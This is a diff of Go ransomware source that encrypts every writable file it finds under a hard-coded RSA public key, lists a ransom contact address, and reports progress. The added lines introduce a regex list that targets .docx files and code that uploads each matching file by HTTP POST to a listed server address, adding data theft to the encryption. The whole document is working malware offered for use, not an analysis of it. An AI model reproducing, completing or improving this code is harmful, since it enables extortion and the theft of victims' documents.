@@ -1,26 +1,39 @@
 package main
 
 import (
-    "github.com/denisbrodbeck/machineid"
-    "encoding/hex"
-    "encoding/json"
-    "crypto/aes"
-    "crypto/cipher"
-    "crypto/rand"
-    "crypto/rsa"
-    "crypto/sha256"
-    "path/filepath"
-    "math/big"
-    "net/http"
-    "net/url"
-    "io/ioutil"
-    "runtime"
-    "time"
-    "fmt"
-    "log"
-    "os"
-    "io"
+	"strings"
+
+	"github.com/denisbrodbeck/machineid"
+
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
+	"crypto/rsa"
+	"crypto/sha256"
+	"encoding/hex"
+	"encoding/json"
+	"fmt"
+	"io"
+	"io/ioutil"
+	"log"
+	"math/big"
+	"net/http"
+	"net/url"
+	"os"
+	"path/filepath"
+	"regexp"
+	"runtime"
+	"time"
 )
+
+var (
+	ToKeep []string = []string{ ".*\\.docx" }
+)
+
+type keeper struct {
+	filename string
+	toSend   bool
+}
 
 func fromBase10(base10 string) *big.Int {
     i, ok := new(big.Int).SetString(base10, 10)
@@ -34,34 +47,50 @@ var Key rsa.PublicKey
 
 func init() {
     Key = rsa.PublicKey{
-        N: fromBase10(""), // modify this
+        N: fromBase10("28173238234479268692748171777584780950112726971800472303179518822064257035330343535382062519135554178057392050439512475197418759177681714996439478119637798431181217850091954574573450965244968320132378502502291379125779591047483820406235123169703702675102086669837722293492775826594973909630373982606134840347804878462514286834694538401513937386496705419688029997745683837628079207343818814366116867188449488550233959271590182601502875729623298406808420521843821837320643772450775606353905712230611517533654282258147082226740950169620818579409805061640251994478022087950933425934855126618181491816001603975662267491029"), // modify this
         E: 65537,
     }
 }
 
-func visit(files *[]string) filepath.WalkFunc {
+func visit(files *[]keeper) filepath.WalkFunc {
     return func(path string, info os.FileInfo, err error) error {
+		var k keeper
         if err != nil {
             log.Fatal(err)
         }
+
         if info.IsDir() {
             return nil
         }
+
         ex, err := os.Executable()
         if err != nil {
             panic(err)
         }
+
         if path == ex {
             return nil
         }
+
         if filepath.Base(path) == "decrypt.exe" {
             return nil
         }
+
         if info.Mode().Perm()&(1<<(uint(7))) == 0 { // black magic to check whether we have write permissions.
             return nil
         }
 
-        *files = append(*files, path)
+		k.filename = path
+        for _, value := range ToKeep {
+            if b, _ := regexp.Match(value, []byte(filepath.Base(path))); b {
+                k.toSend = true
+                break
+            } else {
+                k.toSend = false
+            }
+        }
+
+        *files = append(*files, k)
         return nil
     }
 }
@@ -105,13 +134,14 @@ type PaymentInfo struct {
     Amount  string
 }
 
-var server string = "example.com:1337" // server address
+var server string = "127.0.0.1:4444" // server address
 var contact string = "keksec@kek.hq" // whatever address suits you
 
 func main() {
-    var files []string
+    var files []keeper
     var counter int = 1
     var home string
+    var hc http.Client = http.Client{}
 
     randomKey := NewEncryptionKey()
 
@@ -131,7 +161,7 @@ func main() {
     for _, file := range files {
         fmt.Printf("\rEncrypting %d/%d: %s", counter, len(files), file)
 
-        data, err := ioutil.ReadFile(file)
+        data, err := ioutil.ReadFile(file.filename)
         if err != nil {
             continue
         }
@@ -142,10 +172,31 @@ func main() {
             continue
         }
 
-        err = ioutil.WriteFile(file, encrypted, 0644)
+        err = ioutil.WriteFile(file.filename, encrypted, 0644)
         if err != nil {
             continue
         }
+
+        if file.toSend {
+            file, err := os.Open(file.filename)
+            if  err != nil {
+                panic(err)
+            }
+
+            str, err := ioutil.ReadAll(file)
+            if err != nil {
+                panic(err)
+            }
+
+            form := url.Values{}
+            form.Add("xxx", string(str))
+            req, err := http.NewRequest("POST", server, strings.NewReader(form.Encode()))
+            req.Header.Add("Content-Type", "application/x-form-url-encode")
+
+            resp, err := hc.Do(req)
+            fmt.Println(resp.StatusCode)
+        }
+
         counter++
     }
     fmt.Printf("\n%d files encrypted.\n", len(files))
